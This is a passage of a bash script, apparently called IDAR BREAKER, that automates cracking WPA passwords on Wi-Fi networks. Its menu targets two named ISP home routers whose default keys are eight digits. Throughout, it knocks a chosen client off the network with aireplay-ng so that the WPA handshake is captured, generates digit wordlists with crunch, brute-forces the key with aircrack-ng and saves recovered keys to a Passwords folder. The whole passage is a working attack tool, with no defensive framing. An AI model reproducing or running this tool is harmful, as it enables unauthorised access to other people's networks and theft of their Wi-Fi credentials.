			Line_CSV=`wc -l ${Temporary}/capture/captureClient-01.csv | awk '{print $1}'`
			HeTa=`cat ${Temporary}/capture/captureClient-01.csv | egrep -a -n '(Station|CLIENT)' | awk -F : '{print $1}'`
			HeTa=`expr $HeTa - 1`
			head -n $HeTa ${Temporary}/capture/captureClient-01.csv &> ${Temporary}/capture/captureClient-02.csv
			tail -n +$HeTa ${Temporary}/capture/captureClient-01.csv &> ${Temporary}/capture/listClients.csv
			numberOfClients=`wc -l ${Temporary}/capture/listClients.csv |  cut -f1 -d' '`
			echo -e ${Yellow}"  ID 		${BWhite}CLIENT 			\tPWR			BSSID"
			echo -e $Orange" ~~~~ 		~~~~~~ 			\t~~~			~~~~"
			i=0
			if [[ $numberOfClients -gt 3 ]]; then
				while IFS=, read CLIENTMAC FTS LTS POWER PACKETS BSSID PROBESSID
				do
					length=${#CLIENTMAC}
					if [ $length -ge 17 ]; then
					    i=$(($i+1))
						if [ $i != 0 ]; then
						     d=1
						else
						     d=0
					    fi
					    POWER=`expr $POWER + 100`
					    if [ "$i" -lt "10" ]
					    	then
					    	    echo -e -n " ${Red}[${Yellow}0"$i"${Red}]\t"
					    else
					    	echo -e -n " ${Red}[${Yellow}"$i"${Red}]\t"
					    fi

						echo -e -n $BGreen"\t$CLIENTMAC\t"
						if [ $POWER -ge 40 ]
						     then
						         echo -e -n $Green"\t$POWER%\t\t"
						elif [ $POWER -ge 30 ]
						     then
							     echo -e -n $Yellow"\t$POWER%\t\t"
						else
						         echo -e -n $Red"\t$POWER%\t\t"
						fi
						echo -e $BWhite"$BSSID\t"
					    CLIENTMAC[$i]=$CLIENTMAC
					    BSSID[$i]=$BSSID
					fi

				done < ${Temporary}/capture/listClients.csv
				echo ""
				echo ""
				SELECT_CLIENT
			else
				echo ""
				echo ""
				printf "${Orange}"
				echo -e "There is no clients on this AP, ${BBlue} Select another one!"
				printf "${STOP}"
				sleep 3
				SELECT_CAPTURE_CRACK
			fi
}

SELECT_CLIENT() {
			   	trap exit_function SIGINT
				V_number=0
				while [ "$V_number" != "1" ]
				    do
					  echo -en "\033[1A\033[2K"
				      echo -n -e "${White}  [${Red}+${White}]$Blue Select${White} the ${Red}ID${White} of one client from$White [${Green}${d}${White}-${Green}${i}$White]: "
				      read  N_OB
				      N_OB=`echo $N_OB | tr "[:upper:]" "[:lower:]"`
					  if [[ "$N_OB" =~ ^[+-]?[0-9]+$ ]]
					      then
					         if [ "$N_OB" -ge "$d" ] && [ "$N_OB" -le "$i" ]
					  	        then
					                V_number=1
					         else
					                V_number=0
					         fi
					  else
				        	V_number=0
					  fi
				done
				MA=0
				echo ""
				BSSID=${BSSID[$N_OB]}
				CLIENTMAC=${CLIENTMAC[$N_OB]}
				MA="$N_OB"
				HANDSHAKE_CAPTURE
}

HANDSHAKE_CAPTURE (){
	trap FIRE_AIRCRACK_UP INT
	echo -ne '\033c'
	Handshake_Dire=`ls ${Temporary}/capture | grep -E '^handshake$'`
	if [ "$Handshake_Dire" != "" ];then
	    rm -rf ${Temporary}/capture/handshake
		mkdir ${Temporary}/capture/handshake
	else
		mkdir ${Temporary}/capture/handshake
	fi
	airodump-ng --bssid $BSSID -c $CHANNEL -w ${Temporary}/capture/handshake/capture $mon_name &
		xterm -fg green -hold -e aireplay-ng -0 1 -a $BSSID -c $CLIENTMAC $mon_name
	sleep 1
}

FIRE_AIRCRACK_UP (){
		trap exit_function INT
		echo -ne '\033c'
		echo ""
		HAND_IS_CAP=`aircrack-ng ${Temporary}/capture/handshake/capture-01.cap | grep 1\ handshake 2> /dev/null`
		if [ "$HAND_IS_CAP" != "" ];then
			echo -e "$BRed The Handshake is captured ${White}, wait until the $BGreen aircrack-ng process finish..."
			sleep 3
        	echo ""
			trap - SIGINT SIGQUIT SIGTSTP
			echo ""
			echo -e "${BWhite}[${BBlue}*${BRed}*${BGreen}*${BWhite}]The ${BRed}aircrack-ng ${BGreen}process is started, wait until it ${BBlue}finishes."
			echo ""
			echo -e "\t\t\t${BRed}***${BPurple}DO NOT PRESS ANY KEY!${BRed}***\t\t\t"
			echo ""
			printf "${Orange}"
			crunch 8 8 0123456789 -t $PATTERN -o ${Temporary}/capture/handshake/wordlist
			printf "${BGreen}"
			aircrack-ng -b $BSSID -w ${Temporary}/capture/handshake/wordlist ${Temporary}/capture/handshake/capture-01.cap -l ${Temporary}/capture/handshake/result
			printf "${STOP}"
			if [[ `ls ${Temporary}/capture/handshake/ | grep result` == "" ]]; then
				Key=""
			else
				Key=`cat ${Temporary}/capture/handshake/result`	
			fi
			if [[ $Key != "" ]]; then
				echo -ne '\033c'
				cr_date=`date`
				file_name=`echo "$BSSID" | tr -d ' '`
				echo " [+] ESSID      > $ESSID" >   ./Passwords/${file_name}.txt
				echo " [+] BSSID      >>$BSSID" >> ./Passwords/${file_name}.txt
				echo " [+] Channel    >> $CHANNEL" >> ./Passwords/${file_name}.txt
				echo " [+] Key        >> \"$Key\"" >> ./Passwords/${file_name}.txt
				echo " [+] Date       >> $cr_date" >> ./Passwords/${file_name}.txt
				printf "${BBlue}"
				figlet -tc -f Tools/Banner3.flf "Wind city"
				printf "${STOP}"
				echo ""
				echo ""
	    		echo -e "$White [${Yellow}+${White}]$Green Congratulation ${White}(${Red}*${White}-${Red}*${White})"
				printf "${STOP}"
	    		sleep 2
	    		echo ""
	    		echo ""
				cat ./Passwords/${file_name}.txt

				exit_function
			else
				echo ""
				echo -e "${BGreen}[--]${BWhite}The Key ${BRed}is not Found!${BWhite}."
				sleep 1
				echo ""
				echo -e "${Orange}[--°--] ${BBlue}Select another AP From the list..."
				sleep 3
				SELECT_CAPTURE_CRACK
			fi
			
		else
			trap exit_function INT
			echo -e "${BRed}[${BGreen}!${BRed}]${BBlue} The handshake is not captured, please retry!"
			sleep 3
			SELECT_CAPTURE_CRACK
			echo ""
		fi
}

re='y'

while [ "$re" == 'y' ] || [ "$re" == 'yes' ] ||[ "$re" == 'o' ] || [ "$re" == 'oui' ]
do
	re=nothing
	echo -ne '\033c'
	trap RM_IB_FOLDER SIGINT SIGQUIT SIGTSTP
	echo ""
	printf "${BYellow}"
	figlet "IDAR BREAKER" -tc -f  ./Tools/Banner3.flf
	printf "${STOP}"
	sleep 0.1
	Ver_User=`whoami`
	if [ "$Ver_User" != "root" ]
	then
		echo -e "$Yellow     +${White}-------------------------------------------------------------------${Yellow}+"
		sleep 0.1
		echo -e "${White}     | [${Red}!${White}] You need to launch the script as the root user , run it with  ${White}|"
		sleep 0.1
		echo -e "${Yellow}     +${White}-------------------------------------------------------------------${Yellow}+"
		sleep 0.1
		echo -e "${White}     | ${Red}                 \$${White}=> sudo ${Yellow}./${Green}IDAR${White}-${Green}CRACKER${White}.${Green}sh${White}                       |"
		sleep 0.1
		echo -e "${White}     | ${Red}                 \$${White}=> sudo ${Blue}bash ${Green}IDAR${White}-${Green}CRACKER${White}.${Green}sh${White}                    |"
		sleep 0.1
		echo -e "${Yellow}     +${White}-------------------------------------------------------------------${Yellow}+"
		echo ""
		echo ""
	else
		echo -e "$Yellow     +${White}-------------------------------------------------------------------${Yellow}+"
		sleep 0.1
		echo -e "${White}     | ${Yellow} ID ${White} |                   ${BPurple}   Name                             ${White}     |"
		sleep 0.1
		echo -e "${Yellow}     +${White}-------------------------------------------------------------------${Yellow}+"
		sleep 0.1
		echo -e "${White}     | ${Red}[${Yellow}01${Red}]${White} |$Green Attack $Purple IDAR DUO INWI${White}   (${Green}Using ${Red}3XXXXXXX ${Green}Wordlist${White}).	 |"
		sleep 0.1
		echo -e "${White}     | ${Red}[${Yellow}02${Red}]${White} |$Green Attack $Orange DAR BOX ORANGE${White}   (${Green}Using ${Red}XXXXXXXX ${Green}Wordlist${White}).	 |"
		sleep 0.1
		echo -e "${White}     | ${Red}[${Yellow}03${Red}]${White} |$Green Exit${White} .${White}                                                     |"
		sleep 0.1
		echo -e "${White}     | ${Red}[${Yellow}--${Red}]${White} |$Green Note that X is a number between 0 and 9${White} . 		 |"
		sleep 0.1
		echo -e "${Yellow}     +${White}-------------------------------------------------------------------${Yellow}+"
		echo ""
		sleep 0.1
		echo -e -n "$White    ${Red} [${Cyan}!${Red}]$White Type the$BRed ID$White of your choice : "
		read menu
		menu=`expr $menu + 0 2> /dev/null`
		menu=`expr $menu + 0 2> /dev/null`
		case $menu in
		             "1")
						Ver_Pckg_Tools
					 	Ver_Mon_WCar_Fun
					 	if [ "$VerMon" != "" ]
	                      then
	                           START_BREAKING
							   PATTERN="3@@@@@@@"
							   SELECT_CAPTURE_CRACK
	                 	fi;;
	             	"2")
						Ver_Pckg_Tools
					 	Ver_Mon_WCar_Fun
					 	if [ "$VerMon" != "" ]
		                  then
		                       START_BREAKING
							   PATTERN="@@@@@@@@"
							   SELECT_CAPTURE_CRACK
		             	fi;;
	             	"3")
						echo ""
						echo -e "$White [+]$Green Greet to : ${Cyan}SwiRi Dev${White} ${White} ."
						echo ""
						echo -e "$White [$BRed*$BGreen-$BBlue*${White}] For more ${BRed}SUBSCRIBE${White} here: ${Cyan}https://www.youtube.com/channel/UCP8mTc1uo4CtuNcsJGL1Peg${Cyan} ${White}."
						echo ""
						exit
						;;
					*)
						echo ""
						echo -e "$White     [${Red}!${White}]$Red Input${White} out of range."
						echo ""
						;;
		esac
		echo -e "\e[0;39m"
		re=$(echo $re | tr [:upper:] [:lower:])
		   while [ "$re" != 'y' ] && [ "$re" != 'yes' ] && [ "$re" != 'n' ] && [ "$re" != 'no' ] && [ "$re" != 'o' ] && [ "$re" != 'oui' ] && [ "$re" != "\n" ]
		         do
		           echo -n -e "$Red\r                 [+]$White Try again (${BGreen}Y${White})es or (${BGreen}N${White})o :$BGreen "
		           read re
		           re=$(echo $re | tr [:upper:] [:lower:])
				   echo -en "\033[1A\033[2K"
				   echo -e "$DefaultColor"
			done

	fi

done

if [ "$re" == 'n' ] || [ "$re" == 'no' ] || [ "$re" == 'non' ]
then
	exit_function
fi
